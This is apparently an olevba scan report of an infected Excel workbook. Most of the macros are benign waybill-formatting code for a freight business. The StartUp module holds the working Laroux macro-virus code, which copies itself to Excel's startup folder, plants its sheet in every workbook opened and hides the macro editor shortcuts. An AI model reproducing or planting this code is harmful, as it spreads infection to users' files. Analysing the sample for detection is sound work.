olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.ze-3127b369d01386b84ded806bdb67991870e678886eb68404a97be8b4f9e25121
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux.ze-3127b369d01386b84ded806bdb67991870e678886eb68404a97be8b4f9e25121 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO 国际分单专用.bas 
in file: Virus.MSExcel.Laroux.ze-3127b369d01386b84ded806bdb67991870e678886eb68404a97be8b4f9e25121 - OLE stream: '_VBA_PROJECT_CUR/VBA/国际分单专用'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function putOtherCharges(DataRange As Range, startRow As Integer) As Integer
    Dim Cols As Integer
    Dim Rows As Integer
    Dim i As Integer
    Dim rtStr As String
    
    For i = startRow To DataRange.Rows.Count
        If DataRange.Cells(i, 1).Value = "/" Then
            Exit For
        End If
        If i = startRow Then
            rtStr = Format(DataRange.Cells(i, 1).Value) + ": " + Format(DataRange.Cells(i, 2).Value, "0.00")
        Else
            rtStr = rtStr + "    " + Format(DataRange.Cells(i, 1).Value) + ": " + Format(DataRange.Cells(i, 2).Value, "0.00")
        End If
    Next i
'    MsgBox rtStr
    Sheets("格式化打印").Range("N30").Value = rtStr
    putOtherCharges = i + 1
End Function
Sub putGoodsInfo(DataRange As Range, startRow As Integer, ProdNames As String, OtherInfo As String)
    Dim Cols As Integer
    Dim Rows As Integer
    Dim i As Integer
    Dim rtStr As String
    Dim strVolume As String
    
    For i = startRow To DataRange.Rows.Count
        If DataRange.Cells(i, 1).Value = "/" Then
            Exit For
        End If
        If i = startRow Then
            rtStr = Format(DataRange.Cells(i, 1).Value) + " x " + Format(DataRange.Cells(i, 2).Value) + " x " + Format(DataRange.Cells(i, 3).Value) + " CM x " + Format(DataRange.Cells(i, 4).Value)
        Else
            rtStr = rtStr + Chr(10) + Format(DataRange.Cells(i, 1).Value) + " x " + Format(DataRange.Cells(i, 2).Value) + " x " + Format(DataRange.Cells(i, 3).Value) + " CM x " + Format(DataRange.Cells(i, 4).Value)
        End If
        rtStr = Replace(rtStr, " x  x  CM x ", "")
    Next i
'    MsgBox rtStr
    If Val(Sheets("原始数据").Range("AY1").Value) <> 0 And Sheets("原始数据").Range("AY1").Value <> "" Then
        strVolume = Format(Sheets("原始数据").Range("AY1").Value, "0.000") + "M3" + Chr(10)
    End If
    Sheets("格式化打印").Range("AE21").Value = ProdNames + Chr(10) + rtStr + Chr(10) + strVolume + OtherInfo
End Sub
Function putWeightCharge(DataRange As Range, tgtSheet As Worksheet) As Integer
    Dim Cols As Integer
    Dim Rows As Integer
    Dim i As Integer
    Dim rtStr As String
    Dim j As Integer
    Dim strNotify As String
    
    For i = 5 To 12
        If DataRange.Cells(i, 1).Value = "/" Then
            Exit For
        End If
        tgtSheet.Cells(16 + i, 1).Value = DataRange.Cells(i, 1).Value
        tgtSheet.Cells(16 + i, 3).Value = DataRange.Cells(i, 2).Value
        tgtSheet.Cells(16 + i, 7).Value = DataRange.Cells(i, 3).Value
        tgtSheet.Cells(16 + i, 8).Value = DataRange.Cells(i, 4).Value
        tgtSheet.Cells(16 + i, 11).Value = DataRange.Cells(i, 5).Value
        tgtSheet.Cells(16 + i, 16).Value = DataRange.Cells(i, 6).Value
        tgtSheet.Cells(16 + i, 21).Value = DataRange.Cells(i, 7).Value
    Next i
    If i < 12 Then
        tgtSheet.Range(tgtSheet.Cells(16 + i, 1), tgtSheet.Cells(28, 28)).Merge
        If Sheets("原始数据").Range("AX1").Value <> "" Then
            strNotify = Chr(10) + "NOTIFY:" + Sheets("原始数据").Range("AX1").Value
        End If
        tgtSheet.Range(tgtSheet.Cells(16 + i, 1), tgtSheet.Cells(16 + i, 1)).Value = Sheets("原始数据").Range("AT1").Value + Chr(10) + strNotify
    End If
    putWeightCharge = i + 1
End Function
Sub TestOC()
    putGoodsInfo Sheets("原始数据").Range("A1:AW9"), putOtherCharges(Sheets("原始数据").Range("A1:AW9")), "fhdakjshf   fsdlhf", "uyeruiy ryweuio"
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSExcel.Laroux.ze-3127b369d01386b84ded806bdb67991870e678886eb68404a97be8b4f9e25121 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO 模块1.bas 
in file: Virus.MSExcel.Laroux.ze-3127b369d01386b84ded806bdb67991870e678886eb68404a97be8b4f9e25121 - OLE stream: '_VBA_PROJECT_CUR/VBA/模块1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FormatData(DataRange As Range)
    Dim tmpStr As String
    Dim RowLen As Integer
    Dim ColLen As Integer
    Dim i As Integer
    Dim j As Integer
    
    RowLen = DataRange.Rows.Count
    ColLen = DataRange.Rows(1).Cells.Count
    
    For i = 1 To RowLen
        For j = 1 To ColLen
            tmpStr = DataRange.Rows(i).Cells(j).Value
            DataRange.Rows(i).Cells(j).Value = Replace(DataRange.Rows(i).Cells(j).Value, "~00~", "", , 1)
            DataRange.Rows(i).Cells(j).Value = Replace(DataRange.Rows(i).Cells(j).Value, "~sp~", " ")
            DataRange.Rows(i).Cells(j).Value = Replace(DataRange.Rows(i).Cells(j).Value, "~nn~", Chr(10))
        Next
    Next
End Sub

Function GetData(URLString As String, SrcSheetName As String) As Range

    Dim SourceSheet As Worksheet
    Dim QTable As QueryTable
    Dim DataRange As Range
    
    Set SourceSheet = Sheets(SrcSheetName)
    Set QTable = SourceSheet.QueryTables.Add(Connection:=URLString, Destination:=SourceSheet.Range("A1"))
    With QTable
        .Name = "webdata"
        .FieldNames = True
        .RowNumbers = False
        .FillAdjacentFormulas = False
        .PreserveFormatting = True
        .RefreshOnFileOpen = False
        .BackgroundQuery = True
        .RefreshStyle = xlOverwriteCells
        .SavePassword = False
        .SaveData = True
        .AdjustColumnWidth = True
        .RefreshPeriod = 0
        .WebSelectionType = xlEntirePage
        .WebFormatting = xlWebFormattingNone
        .WebPreFormattedTextToColumns = True
        .WebConsecutiveDelimitersAsOne = True
        .WebSingleBlockTextImport = False
        .WebDisableDateRecognition = False
        .Refresh BackgroundQuery:=False
    End With
    Set DataRange = QTable.ResultRange
    FormatData DataRange
    Set GetData = DataRange
End Function
Function CopyRange(DataRange As Range, StartCopy As Integer, TargetRange As Range) As Integer
    Dim RowLength As Integer
    Dim i As Integer
    Dim SrcRange As Range
    Dim j As Integer
    Dim targetSheet As Worksheet
    Dim EndRow As Integer
    Dim Changes
    Dim MinRows As Integer
    Dim MaxCols As Integer
    Dim PasteRange As Range
    
    MinRows = TargetRange.Rows.Count
    MaxCols = TargetRange.Columns.Count
    
    Set targetSheet = TargetRange.Worksheet
    RowLength = DataRange.Rows.Count
    For i = StartCopy To RowLength
        If DataRange.Cells(i, 1).Value = "/" Then
            Exit For
        End If
    Next i
    If i > RowLength Then
        EndRow = RowLength
    Else
        EndRow = i - 1
    End If
   
'    MsgBox Format(RowLength) + "::" + Format(MinRows)
    If EndRow - StartCopy + 1 > MinRows Then
'        MsgBox Format(RowLength - MinRows)
        For j = 0 To EndRow - StartCopy - MinRows
            targetSheet.Rows(TargetRange.Cells(1, 1).Row).Copy
            targetSheet.Rows(TargetRange.Cells(1, 1).Row).Insert Shift:=xlToUp
        Next j
            Set TargetRange = TargetRange.Offset(0 - EndRow + StartCopy + MinRows - 1)
            Set TargetRange = targetSheet.Range(TargetRange.End(xlUp), TargetRange.Cells(TargetRange.Rows.Count + EndRow - StartCopy - MinRows + 1, TargetRange.Columns.Count))
    End If
    Changes = MatchingTarget(DataRange.Worksheet, TargetRange)

    Set PasteRange = TargetRange.Cells(1, 1)
    Set SrcRange = DataRange.Range(DataRange.Cells(StartCopy, 1), DataRange.Cells(EndRow, MaxCols))
    SrcRange.Copy
    PasteRange.PasteSpecial (xlPasteValues)
    Set SrcRange = Nothing
    RestorSource DataRange.Worksheet, TargetRange, Changes
    CopyRange = EndRow + 2 - StartCopy
End Function
Sub doIt(ByVal DataURL As String, ByVal printMethod As String, ByVal NoPrint As Boolean)
    Dim s As Integer
    Dim ListCount As Integer
    Dim TargetRange As Range
    Dim MinRows As Integer
    Dim MaxCols As Integer
    Dim i As Integer
    Dim ltCell As String
    Dim rbString As String
    Dim rtValue As Integer
    Dim DataRange As Range
    Dim tempRange As Range
    Dim startRow As Integer
    
    Set DataRange = GetData(DataURL, "原始数据")
    ListCount = CInt(Sheets("配置数据").Cells(1, 2).Value)
    s = 0
    tmp2 = 0
    For i = 0 To ListCount - 1
        ltCell = Replace(Sheets("原始数据").Range(Sheets("配置数据").Cells(3 + i, 2).Value).Offset(s).Address, "$", "")
        rbCell = Replace(Sheets("原始数据").Range(Sheets("配置数据").Cells(3 + i, 3).Value).Offset(s).Address, "$", "")
        
        Set TargetRange = Sheets(printMethod).Range(ltCell + ":" + rbCell)
        rtValue = CopyRange(DataRange, 3 + rtValue, TargetRange)
        If rtValue > TargetRange.Rows.Count Then
            s = rtValue - TargetRange.Rows.Count - 1
        Else
            s = 0
        End If
    Next i
    startRow = putWeightCharge(DataRange, Sheets("格式化打印"))
    putWeightCharge DataRange, Sheets("套打分运单")
    startRow = putOtherCharges(DataRange, startRow)
    putGoodsInfo DataRange, startRow, Format(DataRange.Range("AN1").Value), Format(DataRange.Range("AS1").Value)
    If NoPrint = False Then
        Sheets(printMethod).PrintOut
    End If
End Sub
Function MatchingTarget(SourceSheet As Worksheet, TargetRange As Range)
    Dim rtValue() As Integer
    Dim i As Integer
    Dim Length As Integer
    Dim Addr As String
    Dim extCols As Integer
    Dim k As Integer
    Dim j As Integer
    Dim Counter As Integer
    Dim tmpRange As Range
    Dim targetSheet
    
    Set targetSheet = TargetRange.Worksheet
    
    Application.DisplayAlerts = False
    
    Length = TargetRange.Columns.Count
    Counter = TargetRange.Rows.Count
    k = 1
    ReDim rtValue(0)
    rtValue(0) = 0
    For i = 1 To Length
        Addr = TargetRange.Cells(1, i).MergeArea.Address
        If InStr(Addr, ":") > 0 Then
            extCols = targetSheet.Range(Replace(Addr, "$", "")).Columns.Count
            For j = 1 To extCols - 1
                SourceSheet.Columns(k + j).Insert Shift:=xlToRight
            Next j
            For j = 1 To Counter
                Set tmpRange = targetSheet.Range(TargetRange.Cells(j, i), TargetRange.Cells(j, i + extCols - 1))
                tmpRange.UnMerge
            Next j
            i = i + extCols - 1
        Else
            extCols = 1
        End If
        rtValue(UBound(rtValue)) = extCols - 1
        ReDim Preserve rtValue(UBound(rtValue) + 1)
        rtValue(UBound(rtValue)) = 0
        k = k + extCols
    Next i
'    TargetRange.Borders.LineStyle = xlContinuous
    Application.DisplayAlerts = True
    MatchingTarget = rtValue
End Function
Sub RestorSource(SourceSheet As Worksheet, TargetRange As Range, Changes)
    Dim Length As Integer
    Dim i As Integer
    Dim j As Integer
    Dim k As Integer
    Dim Counter As Integer
    Dim tmpRange As Range
    Dim m As Integer
    
    Counter = TargetRange.Rows.Count
    Length = UBound(Changes) - 1
    If Length = 0 And Changes(0) = 0 Then
        Exit Sub
    End If
    k = 1
    m = 1
    For i = 0 To Length
        For j = 1 To Changes(i)
            SourceSheet.Columns(k + 1).Delete
        Next j
        For j = 1 To Counter
            TargetRange.Worksheet.Range(TargetRange.Cells(j, m), TargetRange.Cells(j, m + Changes(i))).Merge
        Next j
        m = m + Changes(i) + 1
        k = k + 1
    Next i
End Sub
Sub ShowConfig()
    If Sheets("配置数据").Visible <> 0 Then
        Sheets("配置数据").Visible = 0
        Sheets("原始数据").Visible = 0
    Else
        Sheets("配置数据").Visible = -1
        Sheets("原始数据").Visible = -1
        Sheets("配置数据").Select
    End If
End Sub

Sub testSample()
    doIt "URL;http://sinoairgroup/exceltemplate/interhawb.htm", "格式化打印", True
    
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: Virus.MSExcel.Laroux.ze-3127b369d01386b84ded806bdb67991870e678886eb68404a97be8b4f9e25121 - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartU
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - J A L  
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|doIt                |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

